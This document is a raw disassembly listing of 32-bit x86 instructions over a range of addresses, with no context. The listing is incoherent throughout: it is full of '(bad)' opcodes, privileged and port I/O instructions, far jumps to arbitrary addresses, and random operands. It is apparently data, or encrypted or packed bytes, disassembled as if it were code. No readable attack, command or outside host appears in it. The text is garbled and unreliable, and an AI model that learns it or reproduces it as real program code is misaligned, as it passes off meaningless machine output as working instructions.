  410da6:	jb     0x410dfe
  410da8:	(bad)  
  410da9:	jo     0x410dc6
  410dab:	cmp    edx,DWORD PTR [ebx]
  410dad:	pusha  
  410dae:	xor    BYTE PTR [ebx],dl
  410db0:	dec    edx
  410db1:	sbb    ah,al
  410db3:	enter  0x6bc0,0xf1
  410db7:	xchg   ebp,eax
  410db8:	fsub   QWORD PTR [esi]
  410dba:	adc    bl,BYTE PTR [eax]
  410dbc:	sbb    bl,BYTE PTR [eax-0x7d5a6130]
  410dc2:	mov    cl,bh
  410dc4:	jp     0x410e1e
  410dc6:	mov    ecx,0x90276f95
  410dcb:	jb     0x410d50
  410dcd:	cdq    
  410dce:	inc    eax
  410dcf:	push   eax
  410dd0:	sub    edi,DWORD PTR [edi]
  410dd2:	adc    dl,BYTE PTR [ecx+0x638873ae]
  410dd8:	push   esp
  410dd9:	mov    WORD PTR ds:0xb27f9e5b,gs
  410ddf:	out    0x67,al
  410de1:	mov    dl,0x24
  410de3:	test   ax,0xfc2a
  410de7:	cli    
  410de8:	imul   ecx,DWORD PTR [edi+eiz*4-0xb],0x80056aaa
  410df0:	sbb    al,0xc
  410df2:	test   eax,0x228923aa
  410df7:	retf   0x65a2
  410dfa:	(bad)  
  410dfb:	sbb    al,0xba
  410dfd:	pushf  
  410dfe:	lds    eax,FWORD PTR [esi-0x50dc09cb]
  410e04:	dec    edx
  410e05:	lahf   
  410e06:	add    BYTE PTR [ebp+0x1c],dh
  410e09:	mov    eax,DWORD PTR [ecx]
  410e0b:	jo     0x410dc1
  410e0d:	stos   DWORD PTR es:[edi],eax
  410e0e:	fs mov ch,0x47
  410e11:	aam    0xb9
  410e13:	push   ds
  410e14:	int3   
  410e15:	lock jns 0x410e8f
  410e18:	lods   eax,DWORD PTR ds:[esi]
  410e19:	xchg   DWORD PTR [eax-0x24d1c53e],edx
  410e1f:	xchg   edi,eax
  410e20:	inc    ebx
  410e21:	aaa    
  410e22:	pop    eax
  410e23:	les    esi,FWORD PTR [edx+edi*2]
  410e26:	xchg   esi,eax
  410e27:	add    DWORD PTR [eax+0x48c34c56],ecx
  410e2d:	mov    bh,0xf
  410e2f:	mov    ecx,0xddb614db
  410e34:	jb     0x410e90
  410e36:	jb     0x410dd3
  410e38:	pop    edi
  410e39:	inc    esp
  410e3a:	xchg   BYTE PTR [ebp+0x77],bl
  410e3d:	fsubrp st(6),st
  410e3f:	xor    DWORD PTR [edx+0x14e94ee6],0xffffff93
  410e46:	(bad)  
  410e47:	xchg   edx,eax
  410e48:	mov    cl,0xf0
  410e4a:	xor    BYTE PTR [esi-0xb],cl
  410e4d:	int    0x77
  410e4f:	dec    eax
  410e50:	mov    al,ds:0x8c42237b
  410e55:	adc    BYTE PTR [ebp+esi*8-0x19124960],bl
  410e5c:	pop    eax
  410e5d:	mov    dh,0x75
  410e5f:	cld    
  410e60:	mov    eax,0x1adef34b
  410e65:	adc    BYTE PTR ds:0xf4b3ff0b,bl
  410e6b:	iret   
  410e6c:	les    ebp,FWORD PTR [ebp+0x1f]
  410e6f:	jnp    0x410e93
  410e71:	push   0x5bc19e18
  410e76:	cmp    al,0xa5
  410e78:	push   ebp
  410e79:	scas   al,BYTE PTR es:[edi]
  410e7a:	push   ebx
  410e7b:	retf   
  410e7c:	stos   DWORD PTR es:[edi],eax
  410e7d:	add    eax,0x59ecfbc6
  410e82:	test   al,dh
  410e84:	loope  0x410e3e
  410e86:	outs   dx,DWORD PTR ds:[esi]
  410e87:	and    eax,0xcbdef119
  410e8c:	adc    BYTE PTR ds:0xf61c77c7,al
  410e92:	loop   0x410e88
  410e94:	cmp    BYTE PTR [eax-0x349cf82e],cl
  410e9a:	inc    BYTE PTR [esi]
  410e9c:	daa    
  410e9d:	iret   
  410e9e:	push   ecx
  410e9f:	mov    ds:0xf4fba452,eax
  410ea4:	xlat   BYTE PTR ds:[ebx]
  410ea5:	(bad)  
  410ea6:	or     BYTE PTR [ebx+0x57],ah
  410ea9:	stc    
  410eaa:	or     DWORD PTR [edx-0x43],0xffffff99
  410eae:	lds    esi,FWORD PTR [ecx+0x6a259058]
  410eb4:	out    0x1c,al
  410eb6:	cs jle 0x410f0b
  410eb9:	cmp    edi,DWORD PTR [ecx+0x1c]
  410ebc:	cli    
  410ebd:	cs dec si
  410ec0:	test   BYTE PTR [edx-0x32],bh
  410ec3:	outs   dx,DWORD PTR ds:[esi]
  410ec4:	(bad)  
  410ec5:	dec    esp
  410ec6:	icebp  
  410ec7:	jnp    0x410ec4
  410ec9:	inc    edi
  410eca:	fistp  DWORD PTR [ecx+0x1a]
  410ecd:	mov    edx,0xa7818380
  410ed2:	jmp    0x1141:0x15555eec
  410ed9:	pop    ds
  410eda:	psubusb mm6,mm0
  410edd:	xchg   edi,eax
  410ede:	(bad)  
  410ee0:	stos   DWORD PTR es:[edi],eax
  410ee1:	and    esi,eax
  410ee3:	push   eax
  410ee4:	inc    ebp
  410ee5:	jnp    0x410ee9
  410ee7:	out    0xca,al
  410ee9:	xor    edi,edi
  410eeb:	dec    ebp
  410eec:	fs sbb eax,0x7d3ff2c1
  410ef2:	fs jp  0x410ebe
  410ef5:	scas   eax,DWORD PTR es:[edi]
  410ef6:	int3   
  410ef7:	(bad)  
  410ef8:	mov    ch,bh
  410efa:	cs mov ebx,0xd8eeb233
  410f00:	jnp    0x410f6b
  410f02:	mov    dl,0x51
  410f04:	es mov ah,0x4c
  410f07:	test   al,0xc5
  410f09:	ds push esi
  410f0b:	dec    DWORD PTR gs:[esi]
  410f0e:	aas    
  410f0f:	or     eax,DWORD PTR [ebx]
  410f11:	mov    BYTE PTR [esi-0x5acc4597],0x58
  410f18:	stos   BYTE PTR es:[edi],al
  410f19:	fdiv   st(1),st
  410f1b:	enter  0x60e8,0x2e
  410f1f:	xchg   ebx,eax
  410f20:	test   al,0xfd
  410f22:	mov    dl,0xec
  410f24:	das    
  410f25:	inc    ebx
  410f26:	hlt    
  410f27:	mov    gs,WORD PTR [eax+eiz*1+0x7b5fa7e5]
  410f2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f2f:	mov    al,0x47
  410f31:	cdq    
  410f32:	fistp  DWORD PTR [ecx+edx*2-0xf]
  410f36:	add    al,0x34
  410f38:	out    0x8f,eax
  410f3a:	popa   
  410f3b:	lahf   
  410f3c:	jmp    0xd347b54c
  410f41:	stos   DWORD PTR es:[edi],eax
  410f42:	test   al,0xba
  410f44:	fcmovb st,st(3)
  410f46:	imul   ebx,DWORD PTR [esi],0x70ae771c
  410f4c:	xchg   edx,eax
  410f4d:	mov    bl,0xe3
  410f4f:	aad    0x38
  410f51:	jle    0x410f55
  410f53:	push   esi
  410f54:	imul   esp,edx,0xffffffa2
  410f57:	cmp    al,0x1d
  410f59:	jmp    0x410f64
  410f5b:	pop    ecx
  410f5c:	mov    bh,0x6
  410f5e:	scas   al,BYTE PTR es:[edi]
  410f5f:	adc    BYTE PTR [eax],dl
  410f61:	mov    cl,0x5
  410f63:	mov    ebp,0x299a8f34
  410f68:	push   ecx
  410f69:	add    DWORD PTR [eax],edx
  410f6b:	bound  esi,QWORD PTR [esi+0x7d]
  410f6e:	mov    cl,BYTE PTR [ebx+0x24]
  410f71:	or     ch,cl
  410f73:	hlt    
  410f74:	cmp    bl,bh
  410f76:	imul   esi,DWORD PTR [ebx+0x64],0x754dab48
  410f7d:	jmp    0x357d:0xb38532ed
  410f84:	out    0xea,al
  410f86:	push   ebp
  410f87:	shl    BYTE PTR [ecx],0xbf
  410f8a:	sub    al,dl
  410f8c:	sub    dl,BYTE PTR [edi]
  410f8e:	outs   dx,BYTE PTR ds:[esi]
  410f8f:	sub    BYTE PTR [ecx+0x6d],cl
  410f92:	ins    DWORD PTR es:[edi],dx
  410f93:	cmc    
  410f94:	repnz (bad) 
  410f96:	xchg   edi,eax
  410f97:	outs   dx,BYTE PTR ds:[esi]
  410f98:	sub    eax,edi
  410f9a:	cmp    eax,DWORD PTR [edi]
  410f9c:	scas   al,BYTE PTR es:[edi]
  410f9d:	stos   DWORD PTR es:[edi],eax
  410f9e:	mov    ds:0xb27fda5f,eax
  410fa3:	mov    eax,ds:0xb0a5b38f
  410fa8:	push   ebp
  410fa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410faa:	aad    0xde
  410fac:	cmc    
  410fad:	pop    ecx
  410fae:	mov    eax,ds:0x4d620263
  410fb3:	inc    eax
  410fb4:	sbb    al,BYTE PTR [edi-0x2f373c0d]
  410fba:	push   0x12
  410fbc:	jmp    DWORD PTR [edx-0x3]
  410fbf:	xor    cl,BYTE PTR [ecx-0x2ce0a449]
  410fc5:	(bad)  
  410fc7:	jecxz  0x410ffe
  410fc9:	jp     0x410faf
  410fcb:	cmp    bl,BYTE PTR [ecx]
  410fcd:	sbb    eax,DWORD PTR [edi+eiz*1+0x26]
  410fd1:	xchg   edi,eax
  410fd2:	loope  0x410f80
  410fd4:	ror    DWORD PTR [ecx+0x27],0x4b
  410fd8:	inc    ecx
  410fd9:	cmp    ebx,DWORD PTR [ecx-0x40]
  410fdc:	outs   dx,DWORD PTR ds:[esi]
  410fdd:	or     cl,BYTE PTR [edi]
  410fdf:	jae    0x411056
  410fe1:	shl    DWORD PTR [eax],1
  410fe3:	mov    ch,0x22
  410fe5:	jmp    0xc05f321c
  410fea:	mov    BYTE PTR [ecx-0x16a859d6],cl
  410ff0:	outs   dx,BYTE PTR ds:[esi]
  410ff1:	(bad)  
  410ff2:	adc    eax,0x4b6abeb
  410ff7:	dec    ebp
  410ff8:	(bad)  
  410ff9:	daa    
  410ffa:	pop    eax
  410ffb:	(bad)  
  410ffc:	and    cl,BYTE PTR [eax]
  410ffe:	jle    0x411020
  411000:	xor    al,0x60
  411002:	jmp    0x41101f
  411004:	adc    al,0x0
  411006:	inc    ecx
  411007:	mov    ecx,0xdc90597c
  41100c:	int    0x72
  41100e:	or     DWORD PTR [edi],edx
  411010:	stos   DWORD PTR es:[edi],eax
  411011:	ror    BYTE PTR [bp+di-0x2725],0xf1
  411017:	(bad)  
  411018:	fnsave [esi]
  41101a:	and    DWORD PTR [eax-0x6061468],edi
  411020:	ret    
  411021:	jns    0x411046
  411023:	jnp    0x410fcd
  411025:	ret    0x4d74
  411028:	sbb    al,0x8c
  41102a:	mov    cl,BYTE PTR [esi+esi*4-0x38]
  41102e:	pop    ebx
  41102f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411030:	mov    DWORD PTR [ebx],edx
  411032:	pop    ecx
  411033:	cld    
  411034:	arpl   dx,dx
  411036:	xchg   ebp,eax
  411037:	push   0xffffffa9
  411039:	sub    DWORD PTR [ecx+0x9f60580],0x22
  411040:	adc    esi,edx
  411042:	out    dx,eax
  411043:	mov    esi,0x2defb130
  411048:	fs ja  0x410ffe
  41104b:	pop    edi
  41104c:	pop    ebx
  41104d:	icebp  
  41104e:	ja     0x411069
  411050:	nop
  411051:	fadd   DWORD PTR [eax]
  411053:	xchg   esi,eax
  411054:	sub    ch,ah
  411056:	push   edi
  411057:	adc    BYTE PTR [ebp-0x38],0x79
  41105b:	sub    eax,0xb359cd80
  411060:	loop   0x411074
  411062:	adc    eax,0x2d08b3e
  411067:	rcr    BYTE PTR [eax+0x34],1
  41106a:	es pushf 
  41106c:	push   es
  41106d:	enter  0x648a,0x1e
  411071:	in     eax,0xcd
  411073:	adc    bl,BYTE PTR [edx+0x7f]
  411076:	lea    ecx,[esi-0x5d]
  411079:	push   edi
  41107a:	and    ebx,DWORD PTR [ebx]
  41107c:	imul   esp,DWORD PTR [edx+0x71],0x214e0f31
  411083:	test   BYTE PTR [ebx],ah
  411085:	shr    DWORD PTR [edi-0x395697f4],0x5b
  41108c:	jae    0x4110fb
  41108e:	mov    ecx,0xf90199e1
  411093:	aaa    
  411094:	test   BYTE PTR ds:[esi-0x36ee3548],dh
  41109b:	inc    ecx
  41109c:	or     cl,BYTE PTR [ebp+0x66d0ffe3]
  4110a2:	xchg   DWORD PTR ds:0xdbf0d4a2,eax
  4110a8:	dec    esp
  4110a9:	mov    ds:0x2394c7f4,eax
  4110ae:	nop
  4110af:	daa    
  4110b0:	pop    es
  4110b1:	shl    DWORD PTR [ebx+ebp*8-0x9],0xe2
  4110b6:	jle    0x411075
  4110b8:	or     bh,bl
  4110ba:	fldenv [esi-0x9]
  4110bd:	out    dx,al
  4110be:	dec    ebp
  4110bf:	ins    BYTE PTR es:[edi],dx
  4110c0:	dec    ebx
  4110c1:	into   
  4110c2:	iret   
  4110c3:	ja     0x4110cf
  4110c5:	adc    al,BYTE PTR [edx]
  4110c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110c8:	add    dl,ah
  4110ca:	cmovno edx,DWORD PTR [eax+0x275ad99c]
  4110d1:	in     al,dx
  4110d2:	aaa    
  4110d3:	out    0xae,eax
  4110d5:	fldenv [edi+ecx*8+0x65f4de10]
  4110dc:	sahf   
  4110dd:	outs   dx,DWORD PTR ds:[esi]
  4110de:	add    BYTE PTR [eax-0xe],al
  4110e1:	test   ecx,esi
  4110e3:	or     dh,al
  4110e5:	adc    DWORD PTR [ecx],ebx
  4110e7:	push   edx
  4110e8:	in     al,0xbb
  4110ea:	scas   al,BYTE PTR es:[edi]
  4110eb:	xchg   edx,eax
  4110ec:	fist   WORD PTR [edi+0x70cb4875]
  4110f2:	addr16 imul edx,ebp,0x2fa0485f
  4110f9:	int    0xb7
  4110fb:	hlt    
  4110fc:	pop    edi
  4110fd:	mov    eax,ds:0xc7cbd963
  411102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411103:	and    DWORD PTR [ebx-0x7e6f8eb9],edi
  411109:	retf   
  41110a:	repnz mov edx,0xdd4e4347
  411110:	outs   dx,DWORD PTR ds:[esi]
  411111:	pop    edx
  411112:	sbb    eax,0x165269cb
  411117:	clc    
  411118:	push   ebp
  411119:	xor    bl,BYTE PTR [eax-0x66]
  41111c:	mov    WORD PTR [ecx+0x20ecd2a9],?
  411122:	mov    BYTE PTR [esi],ch
  411124:	int    0xd5
  411126:	out    dx,eax
  411127:	fild   DWORD PTR [edi-0x315b05f5]
  41112d:	in     eax,0x11
  41112f:	jnp    0x411116
  411131:	or     edx,DWORD PTR [eax]
  411133:	into   
  411134:	(bad)  
  411135:	xchg   ecx,eax
  411136:	cld    
  411137:	call   0xde166fd
  41113c:	setg   BYTE PTR [edx-0x2a]
  411140:	retf   
  411141:	ins    DWORD PTR es:[edi],dx
  411142:	push   0xffffff9c
  411144:	mov    al,0x1f
  411146:	cmp    al,0xc3
  411148:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411149:	(bad)  
  41114b:	fild   WORD PTR [ebx]
  41114d:	jne    0x4110fd
  41114f:	test   BYTE PTR ds:0x687e6c5,ch
  411155:	in     eax,0x87
  411157:	xchg   cl,dh
  411159:	stos   DWORD PTR es:[edi],eax
  41115a:	std    
  41115b:	loop   0x41112c
  41115d:	dec    esi
  41115e:	popf   
  41115f:	ret    0x509c
  411162:	ss inc eax
  411164:	jbe    0x4110f6
  411166:	mov    WORD PTR [ecx+edi*4],ss
  411169:	pop    ss
  41116a:	fldl2e 
  41116c:	loopne 0x41118c
  41116e:	dec    esp
  41116f:	retf   0xf297
  411172:	jnp    0x4111ae
  411174:	pushf  
  411175:	jno    0x41111c
  411177:	(bad)  
  411178:	pop    edx
  411179:	add    ch,0x63
  41117c:	xor    DWORD PTR [esp+edx*1-0x77],ebx
  411180:	pop    ebx
  411181:	push   eax
  411182:	test   DWORD PTR [edi+0x6d],ebp
  411185:	xor    BYTE PTR [eax],dl
  411187:	nop
  411188:	int3   
  411189:	cs out dx,eax
  41118b:	add    BYTE PTR [eax],al
  41118d:	pushf  
  41118e:	inc    esi
  41118f:	sar    BYTE PTR [edi-0x52],1
  411192:	mov    ebx,0xc48be0e8
  411197:	or     ch,BYTE PTR [edx-0x548bb5ae]
  41119d:	arpl   WORD PTR [edx+0x4],si
  4111a0:	xchg   BYTE PTR ds:0xe83a0f0f,cl
  4111a6:	push   ebx
  4111a7:	(bad)  
  4111a8:	out    dx,al
  4111a9:	adc    edx,DWORD PTR ss:[ebx]
  4111ac:	call   FWORD PTR [eax-0x6e]
  4111af:	mov    ebx,0x53822b74
  4111b4:	enter  0x55aa,0x3b
  4111b8:	xor    eax,0x96a2e94
  4111bd:	mov    esi,0xc6baa422
  4111c2:	aad    0xfe
  4111c4:	nop
  4111c5:	adc    BYTE PTR [esi-0x547796f7],dh
  4111cb:	mov    ds:0x1414353b,eax
  4111d0:	xchg   DWORD PTR [edi-0x72c14ee5],ebp
  4111d6:	gs ret 0x86de
  4111da:	and    DWORD PTR [edi+0x1],ecx
  4111dd:	push   edi
  4111de:	xchg   ebx,eax
  4111df:	cmp    DWORD PTR [esi],eax
  4111e1:	xchg   edi,eax
  4111e2:	pop    edi
  4111e3:	cmp    al,ch
  4111e5:	aad    0x2a
  4111e7:	shl    edi,0x8
  4111ea:	jecxz  0x41122b
  4111ec:	push   cs
  4111ed:	aaa    
  4111ee:	mov    eax,ds:0xdcf89e11
  4111f3:	lahf   
  4111f4:	sub    BYTE PTR [edi],ch
  4111f6:	rcr    BYTE PTR [edx+0x49c993eb],1
  4111fc:	push   ds
  4111fd:	test   al,0x42
  4111ff:	fstp   TBYTE PTR ds:0x1316dd14
  411205:	sbb    eax,0xd2e76085
  41120a:	pop    ebp
  41120b:	ret    
  41120c:	and    dl,al
  41120e:	ret    0x7eb3
  411211:	pop    ds
  411212:	cli    
  411213:	mov    ds:0x8ef70598,eax
  411218:	mov    ebx,0x38fa2b36
  41121d:	dec    ebx
  41121e:	cdq    
  41121f:	sub    eax,0xb6cc1201
  411224:	test   DWORD PTR ds:0xac3c5b9b,edx
  41122a:	mov    dl,0xe3
  41122c:	std    
  41122d:	mov    al,BYTE PTR [eax+esi*2]
  411230:	add    DWORD PTR [esi+0x37],ebx
  411233:	mov    esp,0x9916ebb8
  411238:	pop    ds
  411239:	and    al,0xa0
  41123b:	dec    edi
  41123c:	mov    al,ds:0x8f018dac
  411242:	jecxz  0x4112c0
  411244:	ret    
  411245:	gs jl  0x4111c8
  411248:	(bad)  
  411249:	cld    
  41124a:	push   edx
  41124b:	sbb    edi,DWORD PTR [ebp-0x33]
  41124e:	cld    
  41124f:	push   eax
  411250:	shl    BYTE PTR [edi-0x2402d773],1
  411256:	cs lahf 
  411258:	mov    ax,0xf5a3
  41125c:	stc    
  41125d:	pop    esp
  41125e:	cli    
  41125f:	pop    edx
  411260:	jbe    0x4112cb
  411262:	dec    ebx
  411263:	out    0xd0,al
  411265:	adc    ebx,DWORD PTR [edi-0x7f0d975c]
  41126b:	hlt    
  41126c:	adc    al,0x3
  41126e:	sub    BYTE PTR [edi-0x1547b2c0],dh
  411274:	cli    
  411275:	pop    eax
  411276:	call   0x8f6d8528
  41127b:	push   ebp
  41127c:	pop    edx
  41127d:	(bad)  
  41127e:	enter  0x7110,0x3c
  411282:	jmp    0xe17f674e
  411287:	push   ebp
  411288:	mov    ?,edx
  41128a:	push   ecx
  41128b:	adc    esp,esi
  41128d:	add    ecx,DWORD PTR [edx-0x3c]
  411290:	sbb    bh,cl
  411292:	mov    al,ds:0x6039a8bb
  411297:	pop    ds
  411298:	push   eax
  411299:	fst    DWORD PTR [esi]
  41129b:	out    0x46,al
  41129d:	clc    
  41129e:	repz inc eax
  4112a0:	xchg   DWORD PTR [ecx],ecx
  4112a2:	or     DWORD PTR ds:0x8d91609d,ebx
  4112a8:	mov    edx,0x7d83fb8b
  4112ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112ae:	aas    
  4112af:	jl     0x4112c5
  4112b1:	mov    ds:0x3d4bb6f9,al
  4112b6:	xor    al,BYTE PTR [edi-0x1f]
  4112b9:	sub    bh,dl
  4112bb:	and    al,0x54
  4112bd:	jno    0x41124c
  4112bf:	dec    edx
  4112c0:	test   al,0xde
  4112c2:	sbb    BYTE PTR [ebx],bh
  4112c4:	ret    0x3bc9
  4112c7:	xor    ecx,ecx
  4112c9:	aam    0xd1
  4112cb:	bound  esi,QWORD PTR [edx-0x36c64830]
  4112d1:	iret   
  4112d2:	hlt    
  4112d3:	add    al,0x89
  4112d5:	jecxz  0x4112cb
  4112d7:	out    0x31,eax
  4112d9:	icebp  
  4112da:	and    al,0x6a
  4112dc:	xchg   ecx,eax
  4112dd:	pop    eax
  4112de:	push   ebx
  4112df:	(bad)  
  4112e0:	push   ecx
  4112e1:	xchg   dh,cl
  4112e3:	ins    DWORD PTR es:[edi],dx
  4112e4:	shl    cl,1
  4112e6:	jp     0x41134e
  4112e8:	cs dec eax
  4112ea:	repnz scas eax,DWORD PTR es:[edi]
  4112ec:	test   al,0x2b
  4112ee:	cmp    ebx,ecx
  4112f0:	loop   0x41134b
  4112f2:	ins    BYTE PTR es:[edi],dx
  4112f3:	fs push ebp
  4112f5:	test   al,0x65
  4112f7:	fmulp  st(1),st
  4112f9:	(bad)  
  4112fa:	ja     0x411324
  4112fc:	mov    ah,0xff
  4112fe:	popf   
  4112ff:	xor    eax,0xa10840e
  411304:	cmp    eax,0x831f300
  411309:	jg     0x411362
  41130b:	mov    eax,0xdc1d1f1c
  411310:	jb     0x4112e2
  411312:	and    eax,0x8b1b3036
  411317:	add    DWORD PTR [esi-0x3c70043b],esi
  41131d:	add    eax,0x37c5c04d
  411322:	std    
  411323:	lds    edx,FWORD PTR [eax+0x10]
  411326:	jnp    0x411321
  411328:	les    eax,FWORD PTR [eax+0x5a693aac]
  41132e:	fcom   st(6)
  411330:	cwde   
  411331:	popf   
  411332:	xor    al,0x11
  411334:	xchg   edi,eax
  411335:	(bad)  
  411336:	jne    0x4112de
  411338:	in     eax,0x85
  41133a:	xor    al,0x63
  41133c:	inc    ebp
  41133d:	jnp    0x411310
  41133f:	push   eax
  411340:	test   DWORD PTR [ebx],0xa93969fe
  411346:	aas    
  411347:	stos   BYTE PTR es:[edi],al
  411348:	fadd   QWORD PTR [ebx+0x50305c4b]
  41134e:	xor    bh,BYTE PTR [esi+0x62]
  411351:	gs dec eax
  411353:	dec    eax
  411354:	mov    al,ds:0xd2cce67a
  411359:	gs mov esi,0xcba0cb97
  41135f:	int    0x92
  411361:	cmp    al,BYTE PTR [edi-0x23c26d61]
  411367:	fs js  0x411386
  41136a:	(bad)  
  41136b:	mov    edx,0xde482d53
  411370:	popa   
  411371:	je     0x411398
  411373:	(bad)  
  411374:	in     eax,0x96
  411376:	sub    BYTE PTR [esi],ch
  411378:	mov    ds:0x6bc30169,al
  41137d:	(bad)  
  41137e:	imul   eax,DWORD PTR [edx-0x7c],0x7a
  411382:	mov    edi,0x30e38110
  411387:	and    ecx,ebp
  411389:	out    dx,eax
  41138a:	pop    eax
  41138b:	mov    eax,ds:0x3a4fd01d
  411390:	scas   al,BYTE PTR es:[edi]
  411391:	sbb    dh,al
  411393:	arpl   WORD PTR [ecx],cx
  411395:	fdivr  QWORD PTR [ebp+0x44]
  411398:	xor    al,0x68
  41139a:	fwait
  41139b:	sub    DWORD PTR [edi+0x71],ecx
  41139e:	fwait
  41139f:	dec    esi
  4113a0:	dec    esp
  4113a1:	repnz fist WORD PTR [ebp+0x5e97ca97]
  4113a8:	outs   dx,DWORD PTR ds:[esi]
  4113a9:	pop    edi
  4113aa:	ja     0x4113ed
  4113ac:	jp     0x41138d
  4113ae:	xor    DWORD PTR [esi+edx*1-0x794dd35a],0x738c3e9
  4113b9:	and    eax,0xbb21518f
  4113be:	cmp    edi,DWORD PTR [ecx+0x62b8556a]
  4113c4:	xor    BYTE PTR [ebp-0x7e01f172],bh
  4113ca:	add    cl,BYTE PTR [edx+edx*2-0x1e]
  4113ce:	sub    DWORD PTR [ebp-0x1b],esp
  4113d1:	retf   0xe8db
  4113d4:	sbb    al,0x2f
  4113d6:	in     eax,0x46
  4113d8:	inc    esi
  4113d9:	retf   0x326
  4113dc:	sub    edi,DWORD PTR [ebx+0x3f4e9c40]
  4113e2:	sbb    eax,0x26eb99ae
  4113e7:	(bad)  
  4113e8:	sbb    DWORD PTR fs:[ebx+edi*2],ebp
  4113ec:	xor    DWORD PTR [edi-0x5e],ebx
  4113ef:	or     edi,DWORD PTR [ecx+edx*2+0x2e]
  4113f3:	outs   dx,BYTE PTR ds:[esi]
  4113f4:	mov    ds:0x8910a30c,eax
  4113f9:	cmp    BYTE PTR [eax+0xc],0xf4
  4113fd:	ret    0xed5d
  411400:	dec    ebp
  411401:	add    eax,0xbe41dece
  411406:	fiadd  WORD PTR [ecx-0x63b0e58b]
  41140c:	or     al,al
  41140e:	sbb    eax,0xf857f275
  411413:	imul   edx,esp,0xffffffde
  411416:	xchg   BYTE PTR [ebp+0xa066424],bh
  41141c:	daa    
  41141d:	inc    eax
  41141e:	inc    esi
  41141f:	leave  
  411420:	aaa    
  411421:	inc    edi
  411422:	pop    ecx
  411423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411424:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411425:	les    ebx,FWORD PTR [ebx]
  411427:	fsubr  QWORD PTR [eax-0x34]
  41142a:	push   edx
  41142b:	push   ds
  41142c:	jae    0x411431
  41142e:	sbb    esp,edx
  411430:	pop    esp
  411431:	xchg   edx,eax
  411432:	jmp    0x961434da
  411437:	sub    dl,bh
  411439:	ja     0x4113cc
  41143b:	js     0x41147e
  41143d:	add    DWORD PTR [ebx+0x62687d48],eax
  411443:	adc    ch,bh
  411445:	out    0x94,al
  411447:	test   eax,0xc963fcfd
  41144c:	pop    ecx
  41144d:	inc    ebx
  41144e:	les    eax,FWORD PTR [edi+esi*8+0x5f66c577]
  411455:	dec    edi
  411456:	mov    cl,0xfd
  411458:	push   0x9ca8fa65
  41145d:	leave  
  41145e:	ins    DWORD PTR es:[edi],dx
  41145f:	add    BYTE PTR [ebx+0x3a],0xef
  411463:	pop    esp
  411464:	xor    bl,BYTE PTR [esi-0x6c]
  411467:	add    DWORD PTR [ebx+0x7e584e1c],esi
  41146d:	rol    BYTE PTR [ebx],cl
  41146f:	pop    esi
  411470:	cmp    al,0x33
  411472:	mov    al,BYTE PTR [esi-0xe480f]
  411478:	rol    DWORD PTR [eax+esi*8+0x322f83f],0x8d
  411480:	push   0xffffff89
  411482:	lods   eax,DWORD PTR ds:[esi]
  411483:	out    dx,al
  411484:	push   ebp
  411485:	cmp    al,0xe5
  411487:	enter  0xedd1,0xe6
  41148b:	cmp    DWORD PTR [ebx-0x639f2df1],ecx
  411491:	retf   
  411492:	xor    DWORD PTR [edx],eax
  411494:	xor    DWORD PTR ds:0x160a3f23,0xd7cabc47
  41149e:	mov    ds:0x3be9150c,al
  4114a3:	jno    0x4114e1
  4114a5:	pop    ds
  4114a6:	fdiv   st(3),st
  4114a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114a9:	inc    esp
  4114aa:	call   0xaff1:0x59712135
  4114b1:	mov    ebp,0x5f88f8b0
  4114b6:	mov    edi,0x4ca0e0c9
  4114bb:	inc    edx
  4114bc:	cld    
  4114bd:	and    eax,DWORD PTR [edi+0x4f933d7e]
  4114c3:	ins    BYTE PTR es:[edi],dx
  4114c4:	push   eax
  4114c5:	in     eax,dx
  4114c6:	pushf  
  4114c7:	xor    al,bl
  4114c9:	pop    es
  4114ca:	aad    0x4
  4114cc:	jge    0x411525
  4114ce:	pop    ecx
  4114cf:	cmp    esp,DWORD PTR [ecx]
  4114d1:	mov    al,BYTE PTR [esi+ebx*1-0x2a]
  4114d5:	cmp    BYTE PTR [ebx],0x5f
  4114d8:	push   ds
  4114d9:	retf   0xc4c1
  4114dc:	rol    DWORD PTR [ebx+0x23],1
  4114df:	stc    
  4114e0:	cdq    
  4114e1:	and    eax,0xe7c09c0b
  4114e6:	push   ebx
  4114e7:	lods   eax,DWORD PTR ds:[esi]
  4114e8:	ss dec edi
  4114ea:	shl    DWORD PTR ds:0xc2e6b623,1
  4114f0:	xor    ch,bh
  4114f2:	fdivr  st(0),st
  4114f4:	xchg   edi,eax
  4114f5:	mov    ds:0xe6aac0f7,eax
  4114fa:	shr    eax,1
  4114fc:	inc    DWORD PTR [ebx]
  4114fe:	mov    al,BYTE PTR [ebx+0x38bfb9e0]
  411504:	or     cl,BYTE PTR [eax-0x7a03add7]
  41150a:	push   ss
  41150b:	and    DWORD PTR [eax+0x76],ebx
  41150e:	int    0x4a
  411510:	push   edi
  411511:	push   esp
  411512:	cmp    BYTE PTR [edx+0x2bdf212e],dl
  411518:	les    ecx,FWORD PTR [edx-0x19738321]
  41151e:	scas   al,BYTE PTR es:[edi]
  41151f:	add    bh,al
  411521:	pop    ebx
  411522:	jmp    0x5c23e8d5
  411527:	daa    
  411528:	loopne 0x411518
  41152a:	dec    edi
  41152b:	ja     0x4114d4
  41152d:	add    bh,BYTE PTR fs:[eax+0x19]
  411531:	xlat   BYTE PTR ds:[ebx]
  411532:	data16 cmc 
  411534:	mov    bh,0xf7
  411536:	dec    ecx
  411537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411538:	sahf   
  411539:	enter  0x7d65,0xc5
  41153d:	sub    eax,0x7941d3b8
  411542:	test   al,0x50
  411544:	jo     0x4114ca
  411546:	imul   esi,DWORD PTR [edi-0x19c2334e],0xffffffc3
  41154d:	stos   BYTE PTR es:[edi],al
  41154e:	jg     0x41154c
  411550:	stc    
  411551:	xchg   ebx,eax
  411552:	add    BYTE PTR [edi+0x6b76ba1c],bl
  411558:	stos   BYTE PTR es:[edi],al
  411559:	fs (bad) 
  41155b:	sub    eax,0x62b4059b
  411560:	push   ds
  411561:	xchg   esi,eax
  411562:	jns    0x411541
  411564:	aas    
  411565:	xchg   esi,eax
